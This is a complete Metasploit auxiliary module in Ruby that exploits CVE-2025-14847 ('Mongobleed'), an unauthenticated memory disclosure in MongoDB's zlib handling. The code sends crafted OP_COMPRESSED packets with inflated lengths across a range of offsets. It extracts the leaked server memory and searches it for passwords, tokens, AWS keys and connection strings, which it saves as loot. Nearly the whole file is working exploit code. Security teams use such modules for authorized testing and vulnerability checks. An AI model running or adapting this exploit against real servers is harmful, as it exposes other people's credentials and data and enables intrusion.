##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Memory Disclosure (CVE-2025-14847) - Mongobleed',
        'Description' => %q{
          This module exploits a memory disclosure vulnerability in MongoDB's zlib
          decompression handling (CVE-2025-14847). By sending crafted OP_COMPRESSED
          messages with inflated BSON document lengths, the server reads beyond the
          decompressed buffer and returns leaked memory contents in error messages.

          The vulnerability allows unauthenticated remote attackers to leak server
          memory which may contain sensitive information such as credentials, session
          tokens, encryption keys, or other application data.
        },
        'Author' => [
          'Alexander Hagenah', # Metasploit module (x.com/xaitax)
          'Diego Ledda', # Co-author & review (x.com/jbx81)
          'Joe Desimone' # Original discovery and PoC (x.com/dez_)
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-14847'],
          ['URL', 'https://www.wiz.io/blog/mongobleed-cve-2025-14847-exploited-in-the-wild-mongodb'],
          ['URL', 'https://jira.mongodb.org/browse/SERVER-115508'],
          ['URL', 'https://x.com/dez_']
        ],
        'DisclosureDate' => '2025-12-19',
        'DefaultOptions' => {
          'RPORT' => 27017
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Actions' => [
          ['SCAN', { 'Description' => 'Scan and exploit memory leak vulnerability' }],
          ['CHECK', { 'Description' => 'Quick vulnerability check using Wiz magic packet' }]
        ],
        'DefaultAction' => 'SCAN'
      )
    )

    register_options(
      [
        Opt::RPORT(27017),
        OptInt.new('MIN_OFFSET', [true, 'Minimum BSON document length offset', 20]),
        OptInt.new('MAX_OFFSET', [true, 'Maximum BSON document length offset', 8192]),
        OptInt.new('STEP_SIZE', [true, 'Offset increment (higher = faster, less thorough)', 1]),
        OptInt.new('BUFFER_PADDING', [true, 'Padding added to buffer size claim', 500]),
        OptInt.new('LEAK_THRESHOLD', [true, 'Minimum bytes to report as interesting leak', 10]),
        OptBool.new('QUICK_SCAN', [true, 'Quick scan mode - sample key offsets only', false]),
        OptInt.new('REPEAT', [true, 'Number of scan passes (more passes = more data)', 1]),
        OptBool.new('REUSE_CONNECTION', [true, 'Reuse TCP connection for faster scanning', true])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SHOW_ALL_LEAKS', [true, 'Show all leaked fragments, not just large ones', false]),
        OptBool.new('SHOW_HEX', [true, 'Show hexdump of leaked data', false]),
        OptString.new('SECRETS_PATTERN', [true, 'Regex pattern to detect sensitive data', 'password|secret|key|token|admin|AKIA|Bearer|mongodb://|mongo:|conn|auth']),
        OptBool.new('FORCE_EXPLOIT', [true, 'Attempt exploitation even if version check indicates not vulnerable', false]),
        OptInt.new('PROGRESS_INTERVAL', [true, 'Show progress every N offsets (0 to disable)', 500]),
        OptBool.new('SAVE_RAW_RESPONSES', [true, 'Save all raw responses for offline analysis', false]),
        OptBool.new('SAVE_JSON', [true, 'Save leaked data as JSON with metadata', true])
      ]
    )
  end

  # MongoDB Wire Protocol constants
  OP_QUERY = 2004       # Legacy query opcode
  OP_REPLY = 1          # Legacy reply opcode
  OP_COMPRESSED = 2012
  OP_MSG = 2013
  COMPRESSOR_ZLIB = 2

  # Wiz Research "magic packet" for deterministic vulnerability detection
  # This is a crafted OP_COMPRESSED message containing {\"a\": 1} with inflated uncompressedSize
  WIZ_MAGIC_PACKET = [
    '2a000000',     # messageLength (42)
    '01000000',     # requestID
    '00000000',     # responseTo
    'dc070000',     # opCode (OP_COMPRESSED = 2012)
    'dd070000',     # originalOpcode (OP_MSG = 2013)
    '32000000',     # uncompressedSize (50 - inflated)
    '02',           # compressorId (zlib = 2)
    '789c636080028144064620050002ca0073' # zlib compressed payload
  ].join.freeze

  #
  # Quick vulnerability check using Wiz Research magic packet
  #
  def run_check(ip)
    print_status("Running vulnerability check against #{ip}:#{rport}...")

    # First get version info
    version_info = get_mongodb_version
    if version_info
      version_str = version_info[:version]
      print_status("MongoDB version: #{version_str}")
      vuln_status = check_vulnerable_version(version_str)

      case vuln_status
      when :patched
        print_error("Version #{version_str} is PATCHED - not vulnerable")
        return :safe
      when :vulnerable, :vulnerable_eol
        print_good("Version #{version_str} appears vulnerable, confirming with probe...")
      when :unknown
        print_warning("Version #{version_str} - vulnerability status unknown, testing...")
      end
    else
      print_warning('Could not determine MongoDB version, testing anyway...')
    end

    # Check if zlib compression is enabled
    compressors = get_server_compressors
    if compressors
      print_status("Server compressors: #{compressors.join(', ')}")
      unless compressors.include?('zlib')
        print_error('Server does not have zlib compression enabled (required for this vulnerability)')
        return :safe
      end
    else
      print_warning('Could not determine server compression support, testing anyway...')
    end

    # Send the Wiz magic packet to confirm exploitability
    print_status('Sending Wiz magic packet to confirm vulnerability...')
    result = send_magic_packet_check
    case result
    when :vulnerable
      version_msg = version_info ? " (MongoDB #{version_info[:version]})" : ''
      print_good("VULNERABLE - Server leaks memory via CVE-2025-14847#{version_msg}")

      # Report the vulnerability
      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        name: name,
        refs: references,
        info: "Confirmed vulnerable via magic packet check#{version_msg}"
      )
      return :vulnerable
    when :safe
      print_status('Server did not leak memory (may be patched or zlib disabled)')
      return :safe
    when :detected
      version_msg = version_info ? " (MongoDB #{version_info[:version]})" : ''
      print_warning("Server appears to be MongoDB#{version_msg}, but could not confirm vulnerability")
      print_status('Try running with ACTION=SCAN for full exploitation attempt')
      return :detected
    else
      print_error('Could not determine vulnerability status')
      return :unknown
    end
  end

  #
  # Send the Wiz Research magic packet and check for BSON signatures in leaked memory
  #
  def send_magic_packet_check
    connect
    packet = [WIZ_MAGIC_PACKET].pack('H*')
    sock.put(packet)

    response = recv_mongo_response
    disconnect

    return :unknown if response.nil? || response.empty?

    # Check for BSON signatures in response indicating memory leak
    # The Wiz template checks for 'BSON' in the zlib-decoded response or raw response
    leaked = false

    # Try to decompress and check
    begin
      if response.length > 25
        opcode = response[12, 4].unpack1('V')
        if opcode == OP_COMPRESSED
          raw = Zlib::Inflate.inflate(response[25..])
          leaked = true if raw&.upcase&.include?('BSON')
        end
      end
    rescue Zlib::Error
      # Decompression failed, check raw response
    end

    # Check raw response for BSON markers
    leaked = true if response.upcase.include?('BSON')

    # Also check for other leak indicators (field name errors, type errors)
    leaked = true if response =~ /field name '[^']+'/
    leaked = true if response =~ /unrecognized.*type/i

    return :vulnerable if leaked

    # If we got a valid MongoDB response but no leak, server might be patched
    if response.length >= 16
      msg_len = response.unpack1('V')
      return :safe if msg_len > 0 && msg_len <= response.length
    end

    :detected
  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET
    :unknown
  rescue StandardError => e
    vprint_error("Magic packet check error: #{e.message}")
    :unknown
  ensure
    begin
      disconnect
    rescue StandardError
      nil
    end
  end

  #
  # Get server's supported compressors from hello/isMaster response
  #
  def get_server_compressors
    connect
    # Send hello command to get server capabilities
    response = send_command('admin', { 'hello' => 1, 'compression' => ['zlib', 'snappy', 'zstd'] })
    disconnect

    return nil if response.nil?

    # Parse compression field from response
    compressors = []
    if response =~ /compression.*?\[(.*?)\]/m
      compressor_list = ::Regexp.last_match(1)
      compressors << 'zlib' if compressor_list.include?('zlib')
      compressors << 'snappy' if compressor_list.include?('snappy')
      compressors << 'zstd' if compressor_list.include?('zstd')
    end

    # Also check raw bytes for compressor strings
    compressors << 'zlib' if response.include?('zlib') && !compressors.include?('zlib')

    compressors.empty? ? nil : compressors
  rescue StandardError
    nil
  ensure
    begin
      disconnect
    rescue StandardError
      nil
    end
  end

  def check_vulnerable_version(version_str)
    # Parse version for comparison
    version_match = version_str.match(/^(\d+\.\d+\.\d+)/)
    return :unknown unless version_match

    mongodb_version = Rex::Version.new(version_match[1])

    # Check against vulnerable version ranges per MongoDB JIRA SERVER-115508
    if mongodb_version.between?(Rex::Version.new('3.6.0'), Rex::Version.new('3.6.99')) ||
       mongodb_version.between?(Rex::Version.new('4.0.0'), Rex::Version.new('4.0.99')) ||
       mongodb_version.between?(Rex::Version.new('4.2.0'), Rex::Version.new('4.2.99'))
      return :vulnerable_eol
    elsif mongodb_version.between?(Rex::Version.new('4.4.0'), Rex::Version.new('4.4.29')) ||
          mongodb_version.between?(Rex::Version.new('5.0.0'), Rex::Version.new('5.0.31')) ||
          mongodb_version.between?(Rex::Version.new('6.0.0'), Rex::Version.new('6.0.26')) ||
          mongodb_version.between?(Rex::Version.new('7.0.0'), Rex::Version.new('7.0.27')) ||
          mongodb_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.0.16')) ||
          mongodb_version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.2'))
      return :vulnerable
    elsif (mongodb_version >= Rex::Version.new('4.4.30') && mongodb_version < Rex::Version.new('5.0.0')) ||
          (mongodb_version >= Rex::Version.new('5.0.32') && mongodb_version < Rex::Version.new('6.0.0')) ||
          (mongodb_version >= Rex::Version.new('6.0.27') && mongodb_version < Rex::Version.new('7.0.0')) ||
          (mongodb_version >= Rex::Version.new('7.0.28') && mongodb_version < Rex::Version.new('8.0.0')) ||
          (mongodb_version >= Rex::Version.new('8.0.17') && mongodb_version < Rex::Version.new('8.2.0')) ||
          (mongodb_version >= Rex::Version.new('8.2.3'))
      return :patched
    end

    :unknown
  end

  def run_host(ip)
    case action.name
    when 'CHECK'
      run_check(ip)
    when 'SCAN'
      run_scan(ip)
    else
      print_error("Unknown action: #{action.name}")
    end
  end

  def run_scan(ip)
    # Version detection and vulnerability check
    version_info = get_mongodb_version

    if version_info
      version_str = version_info[:version]
      print_status("MongoDB version: #{version_str}")

      vuln_status = check_vulnerable_version(version_str)
      case vuln_status
      when :vulnerable_eol
        print_good("Version #{version_str} is VULNERABLE (EOL, no fix available)")
      when :vulnerable
        print_good("Version #{version_str} is VULNERABLE to CVE-2025-14847")
      when :patched
        print_warning("Version #{version_str} appears to be PATCHED")
        unless datastore['FORCE_EXPLOIT']
          print_status('Set FORCE_EXPLOIT=true to attempt exploitation anyway')
          return
        end
        print_status('FORCE_EXPLOIT enabled, continuing...')
      when :unknown
        print_warning("Version #{version_str} - vulnerability status unknown")
        print_status('Proceeding with exploitation attempt...')
      end
    else
      print_warning('Could not determine MongoDB version')
      print_status('Proceeding with exploitation attempt...')
    end

    # Check compression support
    compressors = get_server_compressors
    if compressors
      print_status("Server compressors: #{compressors.join(', ')}")
      unless compressors.include?('zlib')
        print_error('Server does not support zlib compression - vulnerability not exploitable')
        print_status('The CVE-2025-14847 vulnerability requires zlib compression to be enabled')
        return unless datastore['FORCE_EXPLOIT']

        print_status('FORCE_EXPLOIT enabled, continuing anyway...')
      end
    else
      vprint_warning('Could not determine server compression support, proceeding...')
    end

    # Perform the memory leak exploitation
    exploit_memory_leak(ip, version_info)
  end

  def get_mongodb_version
    connect

    # Build buildInfo command using legacy OP_QUERY
    # This works without authentication on most MongoDB configurations
    response = send_command('admin', { 'buildInfo' => 1 })
    disconnect

    return nil if response.nil?

    # Parse BSON response to extract version
    parse_build_info(response)
  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
    vprint_error("Connection error during version check: #{e.message}")
    nil
  rescue StandardError => e
    vprint_error("Error getting MongoDB version: #{e.message}")
    nil
  ensure
    begin
      disconnect
    rescue StandardError
      nil
    end
  end

  def send_command(database, command)
    # Build BSON document for command
    bson_doc = build_bson_document(command)

    # Build OP_QUERY packet
    # flags (4 bytes) + fullCollectionName + numberToSkip (4) + numberToReturn (4) + query
    collection_name = "#{database}.$cmd\x00"

    query_body = [0].pack('V')              # flags
    query_body << collection_name           # fullCollectionName (null-terminated)
    query_body << [0].pack('V')             # numberToSkip
    query_body << [1].pack('V')             # numberToReturn
    query_body << bson_doc                  # query document

    # Build header
    request_id = rand(0xFFFFFFFF)
    message_length = 16 + query_body.length
    header = [message_length, request_id, 0, OP_QUERY].pack('VVVV')

    # Send and receive
    sock.put(header + query_body)

    # Read response
    response_header = sock.get_once(16, 5)
    return nil if response_header.nil? || response_header.length < 16

    msg_len, _req_id, _resp_to, opcode = response_header.unpack('VVVV')
    return nil unless opcode == OP_REPLY

    # Read rest of response
    remaining = msg_len - 16
    return nil if remaining <= 0

    response_body = sock.get_once(remaining, 5)
    return nil if response_body.nil?

    # OP_REPLY structure:
    # responseFlags (4) + cursorID (8) + startingFrom (4) + numberReturned (4) + documents
    return nil if response_body.length < 20

    response_body[20..] # Return documents portion
  end

  def build_bson_document(hash)
    doc = ''.b

    hash.each do |key, value|
      case value
      when Integer
        if value.between?(-2_147_483_648, 2_147_483_647)
          doc << "\x10"                      # int32 type
          doc << "#{key}\x00"                # key (cstring)
          doc << [value].pack('V')           # value
        else
          doc << "\x12"                      # int64 type
          doc << "#{key}\x00"
          doc << [value].pack('q<')
        end
      when Float
        doc << "\x01"                        # double type
        doc << "#{key}\x00"
        doc << [value].pack('E')
      when String
        doc << "\x02"                        # string type
        doc << "#{key}\x00"
        doc << [value.length + 1].pack('V')  # string length (including null)
        doc << "#{value}\x00"
      when TrueClass, FalseClass
        doc << "\x08"                        # boolean type
        doc << "#{key}\x00"
        doc << (value ? "\x01" : "\x00")
      end
    end

    doc << "\x00" # Document terminator
    [doc.length + 4].pack('V') + doc # Prepend document length
  end

  def parse_build_info(bson_data)
    return nil if bson_data.nil? || bson_data.length < 5

    result = {}

    # Parse BSON document
    doc_len = bson_data[0, 4].unpack1('V')
    return nil if doc_len > bson_data.length

    pos = 4
    while pos < doc_len - 1
      type = bson_data[pos].ord
      break if type == 0

      pos += 1

      # Read key (cstring)
      key_end = bson_data.index("\x00", pos)
      break if key_end.nil?

      key = bson_data[pos...key_end]
      pos = key_end + 1

      case type
      when 0x02  # String
        str_len = bson_data[pos, 4].unpack1('V')
        value = bson_data[pos + 4, str_len - 1]
        pos += 4 + str_len

        case key
        when 'version'
          result[:version] = value
        when 'gitVersion'
          result[:git_version] = value
        when 'sysInfo'
          result[:sys_info] = value
        end
      when 0x03  # Embedded document
        sub_doc_len = bson_data[pos, 4].unpack1('V')
        if key == 'buildEnvironment'
          # Could parse this for more details
        end
        pos += sub_doc_len
      when 0x10  # int32
        pos += 4
      when 0x12  # int64
        pos += 8
      when 0x01  # double
        pos += 8
      when 0x08  # boolean
        pos += 1
      when 0x04  # array
        arr_len = bson_data[pos, 4].unpack1('V')
        pos += arr_len
      else
        # Unknown type, try to continue
        break
      end
    end

    # Try alternate method if version not found (using hello/isMaster)
    result[:version] ||= try_hello_command

    result[:version] ? result : nil
  end

  def try_hello_command
    begin
      response = send_command('admin', { 'hello' => 1 })
      return nil if response.nil?

      # Look for version string in response
      if response =~ /(\d+\.\d+\.\d+)/
        return ::Regexp.last_match(1)
      end
    rescue StandardError
      nil
    end
    nil
  end

  def exploit_memory_leak(ip, version_info)
    all_leaked = ''.b
    unique_leaks = Set.new
    secrets_found = []
    leak_details = [] # For JSON export
    raw_responses = ''.b if datastore['SAVE_RAW_RESPONSES']

    # Determine offsets to scan
    offsets = generate_scan_offsets
    total_offsets = offsets.size
    repeat_count = datastore['REPEAT']
    reuse_conn = datastore['REUSE_CONNECTION']

    if repeat_count > 1
      print_status("Running #{repeat_count} scan passes to maximize data collection...")
    end

    print_status('Connection reuse enabled for faster scanning') if reuse_conn

    # Track overall progress
    progress_interval = datastore['PROGRESS_INTERVAL']
    @persistent_sock = nil
    connection_errors = 0
    max_conn_errors = 5

    1.upto(repeat_count) do |pass|
      if repeat_count > 1
        print_status("=== Pass #{pass}/#{repeat_count} ===")
      end

      print_status("Scanning #{total_offsets} offsets (#{datastore['MIN_OFFSET']}-#{datastore['MAX_OFFSET']}, step=#{datastore['STEP_SIZE']}#{datastore['QUICK_SCAN'] ? ', quick mode' : ''})")

      start_time = Time.now
      scanned = 0
      pass_leaks = 0

      offsets.each do |doc_len|
        # Progress reporting
        scanned += 1
        if progress_interval > 0 && (scanned % progress_interval == 0)
          elapsed = Time.now - start_time
          rate = scanned / elapsed
          remaining = ((total_offsets - scanned) / rate).round
          print_status("Progress: #{scanned}/#{total_offsets} (#{(scanned * 100.0 / total_offsets).round(1)}%) - #{unique_leaks.size} leaks found - ETA: #{remaining}s")
        end

        found_leak = probe_and_extract(doc_len, {
          reuse_conn: reuse_conn,
          unique_leaks: unique_leaks,
          all_leaked: all_leaked,
          secrets_found: secrets_found,
          leak_details: leak_details,
          raw_responses: raw_responses
        })

        if found_leak
          pass_leaks += 1
        end

        connection_errors = 0 # Reset on success
      rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
        connection_errors += 1
        close_persistent_connection
        vprint_error("Connection error at offset #{doc_len}: #{e.message}")
        if connection_errors >= max_conn_errors
          print_error("Too many connection errors (#{max_conn_errors}), aborting scan")
          break
        end
        next
      rescue ::Timeout::Error
        close_persistent_connection
        vprint_error("Timeout at offset #{doc_len}")
        next
      end

      # Pass summary
      if repeat_count > 1
        print_status("Pass #{pass} complete: #{pass_leaks} new leaks (#{unique_leaks.size} total unique)")
      end
    end

    # Clean up persistent connection
    close_persistent_connection

    # Overall summary and loot storage
    if !all_leaked.empty?
      # Report found secrets first
      if secrets_found.any?
        print_line
        print_warning('Potential secrets detected:')
        secrets_found.uniq.each do |secret|
          print_warning("  - #{secret}")
        end
      end

      print_line
      print_good("Total leaked: #{all_leaked.length} bytes")
      print_good("Unique fragments: #{unique_leaks.size}")

      # Store leaked data as loot
      loot_info = 'MongoDB Memory Disclosure (CVE-2025-14847)'
      loot_info += " - Version: #{version_info[:version]}" if version_info&.dig(:version)

      path = store_loot(
        'mongodb.memory_leak',
        'application/octet-stream',
        ip,
        all_leaked,
        'mongobleed.bin',
        loot_info
      )
      print_good("Leaked data saved to: #{path}")

      # Save as JSON with metadata
      if datastore['SAVE_JSON'] && leak_details.any?
        json_data = generate_json_report(ip, version_info, leak_details, secrets_found)
        json_path = store_loot(
          'mongodb.memory_leak.json',
          'application/json',
          ip,
          json_data,
          'mongobleed.json',
          'MongoDB memory leak data with metadata'
        )
        print_good("JSON report saved to: #{json_path}")
      end

      # Save raw responses if enabled
      if datastore['SAVE_RAW_RESPONSES'] && !raw_responses.empty?
        raw_path = store_loot(
          'mongodb.memory_leak.raw',
          'application/octet-stream',
          ip,
          raw_responses,
          'mongobleed_raw.bin',
          'Raw MongoDB responses for offline analysis'
        )
        print_good("Raw responses saved to: #{raw_path}")
      end

      # Report the vulnerability
      vuln_info = "Leaked #{all_leaked.length} bytes of server memory"
      vuln_info += " (MongoDB #{version_info[:version]})" if version_info&.dig(:version)

      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        name: name,
        refs: references,
        info: vuln_info
      )
    else
      print_status("No data leaked from #{ip}:#{rport}")
    end
  end

  #
  # Probe a single offset and extract leaks
  #
  def probe_and_extract(doc_len, opts = {})
    response = send_probe(doc_len, doc_len + datastore['BUFFER_PADDING'], reuse_connection: opts[:reuse_conn])
    return false if response.nil? || response.empty?

    # Save raw response if enabled
    opts[:raw_responses] << response if datastore['SAVE_RAW_RESPONSES'] && opts[:raw_responses]

    leaks = extract_leaks(response)
    found_new_leak = false

    leaks.each do |data|
      next if opts[:unique_leaks].include?(data)

      opts[:unique_leaks].add(data)
      opts[:all_leaked] << data
      found_new_leak = true

      # Store leak details for JSON export
      opts[:leak_details] << {
        offset: doc_len,
        length: data.length,
        data: data,
        printable: data.gsub(/[^[:print:]]/, '.'),
        timestamp: Time.now.utc.iso8601,
        has_secret: check_secrets(data, doc_len, opts[:secrets_found])
      }

      # Report large leaks or all if configured
      next unless data.length > datastore['LEAK_THRESHOLD'] || datastore['SHOW_ALL_LEAKS']

      preview = data.gsub(/[^[:print:]]/, '.')[0, 80]
      print_good("offset=#{doc_len.to_s.ljust(4)} len=#{data.length.to_s.ljust(4)}: #{preview}")

      # Show hex dump if enabled
      if datastore['SHOW_HEX'] && !data.empty?
        print_hexdump(data)
      end
    end

    found_new_leak
  end

  #
  # Generate JSON report with all leak data and metadata
  #
  def generate_json_report(ip, version_info, leak_details, secrets_found)
    report = {
      scan_info: {
        target: ip,
        port: rport,
        mongodb_version: version_info&.dig(:version),
        scan_time: Time.now.utc.iso8601,
        cve: 'CVE-2025-14847'
      },
      scan_parameters: {
        min_offset: datastore['MIN_OFFSET'],
        max_offset: datastore['MAX_OFFSET'],
        step_size: datastore['STEP_SIZE'],
        quick_scan: datastore['QUICK_SCAN'],
        repeat_passes: datastore['REPEAT']
      },
      summary: {
        total_leaks: leak_details.size,
        total_bytes: leak_details.sum { |l| l[:length] },
        secrets_found: secrets_found.size,
        unique_offsets: leak_details.map { |l| l[:offset] }.uniq.size
      },
      secrets: secrets_found.uniq,
      leaks: leak_details.map do |leak|
        {
          offset: leak[:offset],
          length: leak[:length],
          data_base64: Rex::Text.encode_base64(leak[:data]),
          data_printable: leak[:printable][0, 200],
          has_secret: leak[:has_secret],
          timestamp: leak[:timestamp]
        }
      end
    }

    JSON.pretty_generate(report)
  end

  #
  # Send probe with optional connection reuse
  #
  def send_probe(doc_len, buffer_size, reuse_connection: true)
    packet = build_probe_packet(doc_len, buffer_size)

    if reuse_connection
      # Use persistent connection for speed
      begin
        ensure_persistent_connection
        @persistent_sock.put(packet)
        recv_mongo_response_from(@persistent_sock)
      rescue StandardError
        # Connection failed, try fresh connection
        close_persistent_connection
        send_probe_fresh(packet)
      end
    else
      send_probe_fresh(packet)
    end
  end

  def build_probe_packet(doc_len, buffer_size)
    # Build minimal BSON content - we lie about total length to trigger the bug
    # int32 field "a" with value 1
    bson_content = "\x10a\x00\x01\x00\x00\x00".b

    # BSON document with inflated length (this is the key to the exploit)
    bson = [doc_len].pack('V') + bson_content

    # Wrap in OP_MSG structure
    # flags (4 bytes) + section kind (1 byte) + BSON
    op_msg = [0].pack('V') + "\x00".b + bson

    # Compress the OP_MSG payload
    compressed_data = Zlib::Deflate.deflate(op_msg)

    # Build OP_COMPRESSED payload
    # originalOpcode (4 bytes) + uncompressedSize (4 bytes) + compressorId (1 byte) + compressedData
    payload = [OP_MSG].pack('V')
    payload << [buffer_size].pack('V') # Claimed uncompressed size (inflated)
    payload << [COMPRESSOR_ZLIB].pack('C')
    payload << compressed_data

    # MongoDB wire protocol header
    # messageLength (4 bytes) + requestID (4 bytes) + responseTo (4 bytes) + opCode (4 bytes)
    message_length = 16 + payload.length
    header = [message_length, rand(0xFFFFFFFF), 0, OP_COMPRESSED].pack('VVVV')

    header + payload
  end

  def ensure_persistent_connection
    return if @persistent_sock && !@persistent_sock.closed?

    connect
    @persistent_sock = sock
  end

  def close_persistent_connection
    return unless @persistent_sock

    begin
      @persistent_sock.close unless @persistent_sock.closed?
    rescue StandardError
      nil
    end
    @persistent_sock = nil
  end

  def send_probe_fresh(packet)
    response = nil
    begin
      connect
      sock.put(packet)
      response = recv_mongo_response
    ensure
      begin
        disconnect
      rescue StandardError
        nil
      end
    end
    response
  end

  def recv_mongo_response
    recv_mongo_response_from(sock)
  end

  def recv_mongo_response_from(socket)
    # Read header first (16 bytes minimum)
    header = socket.get_once(16, 2)
    return nil if header.nil? || header.length < 4

    msg_len = header.unpack1('V')
    return header if msg_len <= 16

    # Read remaining data
    remaining = msg_len - header.length
    if remaining > 0
      data = socket.get_once(remaining, 2)
      return header if data.nil?

      header + data
    else
      header
    end
  rescue ::Timeout::Error, ::EOFError
    nil
  end

  #
  # Extract leaks with additional patterns (raw bytes, BSON markers, strings)
  #
  def extract_leaks(response)
    return [] if response.nil? || response.length < 25

    leaks = []

    begin
      msg_len = response.unpack1('V')
      return [] if msg_len > response.length

      # Check if response is compressed (opcode at offset 12)
      opcode = response[12, 4].unpack1('V')

      raw = nil
      if opcode == OP_COMPRESSED
        # Decompress: skip header (16) + originalOpcode (4) + uncompressedSize (4) + compressorId (1) = 25 bytes
        begin
          raw = Zlib::Inflate.inflate(response[25, msg_len - 25])
        rescue Zlib::Error
          # Try without decompression
          raw = response[25, msg_len - 25]
        end
      else
        # Uncompressed OP_MSG - skip header
        raw = response[16, msg_len - 16]
      end

      return [] if raw.nil?

      # Extract field names from BSON parsing errors
      raw.scan(/field name '([^']*)'/) do |match|
        data = match[0]
        next if data.nil? || data.empty?
        next if ['?', 'a', '$db', 'ping', 'ok', 'errmsg', 'code', 'codeName'].include?(data)

        leaks << data
      end

      # Extract type bytes from unrecognized BSON type errors
      raw.scan(/(?:unrecognized|unknown|invalid)\s+(?:BSON\s+)?type[:\s]+(\d+)/i) do |match|
        type_byte = match[0].to_i & 0xFF
        leaks << type_byte.chr if type_byte > 0
      end

      # Extract any quoted strings from error messages (broader pattern)
      raw.scan(/'([^']{4,})'/) do |match|
        data = match[0]
        next if data.nil? || data.empty?
        next if data.length < 4 # Skip very short strings
        next if data =~ /^\$?[a-z]+$/i && data.length < 8 # Skip simple field names

        leaks << data
      end

      # Extract printable ASCII sequences from raw bytes (minimum 6 chars)
      raw.scan(/[\x20-\x7E]{6,}/) do |match|
        next if match.nil? || match.empty?
        # Filter out common MongoDB response strings
        next if match =~ /^(errmsg|codeName|ok|code|\$db|admin)$/
        next if leaks.include?(match)

        leaks << match
      end

      # Look for MongoDB connection strings
      raw.scan(%r{mongodb(?:\+srv)?://[^\s"'<>]+}) do |match|
        leaks << match unless leaks.include?(match)
      end

      # Look for potential JSON/BSON fragments
      raw.scan(/\{[^{}]{5,100}\}/) do |match|
        next if match.nil? || match.empty?
        next if match =~ /^\{\s*\}$/ # Skip empty objects

        leaks << match unless leaks.include?(match)
      end
    rescue Zlib::Error => e
      vprint_error("Decompression error: #{e.message}")
    rescue StandardError => e
      vprint_error("Error extracting leaks: #{e.message}")
    end

    leaks.uniq
  end

  def check_secrets(data, offset, secrets_found)
    pattern = Regexp.new(datastore['SECRETS_PATTERN'], Regexp::IGNORECASE)
    return false unless data =~ pattern

    match = ::Regexp.last_match[0]
    match_pos = ::Regexp.last_match.begin(0)

    # Extract context around the match (20 chars before and after)
    context_start = [match_pos - 20, 0].max
    context_end = [match_pos + match.length + 20, data.length].min
    context = data[context_start...context_end].gsub(/[^[:print:]]/, '.')

    # Highlight position in context
    secret_info = "Pattern '#{match}' at offset #{offset}"
    secret_info += " (pos #{match_pos}): ...#{context}..."

    secrets_found << secret_info
    print_warning("Secret pattern detected at offset #{offset}: '#{match}' in context: ...#{context}...")
    true
  end

  def generate_scan_offsets
    min_off = datastore['MIN_OFFSET']
    max_off = datastore['MAX_OFFSET']
    step = datastore['STEP_SIZE']

    if datastore['QUICK_SCAN']
      # Quick scan mode: sample key offsets that typically yield results
      # Based on common BSON document sizes and memory alignment
      quick_offsets = []

      # Small offsets (header area)
      quick_offsets += (20..100).step(5).to_a

      # Power of 2 boundaries (common allocation sizes)
      [128, 256, 512, 1024, 2048, 4096, 8192].each do |boundary|
        next if boundary < min_off || boundary > max_off

        # Sample around boundaries
        (-10..10).step(2).each do |delta|
          off = boundary + delta
          quick_offsets << off if off >= min_off && off <= max_off
        end
      end

      # Sample every 128 bytes for broader coverage
      quick_offsets += (min_off..max_off).step(128).to_a

      quick_offsets.uniq.sort.select { |o| o >= min_off && o <= max_off }
    else
      # Normal scan with step size
      (min_off..max_off).step(step).to_a
    end
  end

  def print_hexdump(data)
    return if data.nil? || data.empty?

    # Print hexdump in classic format (16 bytes per line)
    offset = 0
    data.bytes.each_slice(16) do |chunk|
      hex_part = chunk.map { |b| '%02x' % b }.join(' ')
      ascii_part = chunk.map { |b| (b >= 32 && b < 127) ? b.chr : '.' }.join

      # Pad hex part if less than 16 bytes
      hex_part = hex_part.ljust(47)

      print_line("    #{('%04x' % offset)}  #{hex_part}  |#{ascii_part}|")
      offset += 16

      # Limit output to avoid flooding console
      break if offset >= 256
    end
    print_line('    ...') if data.length > 256
  end
end
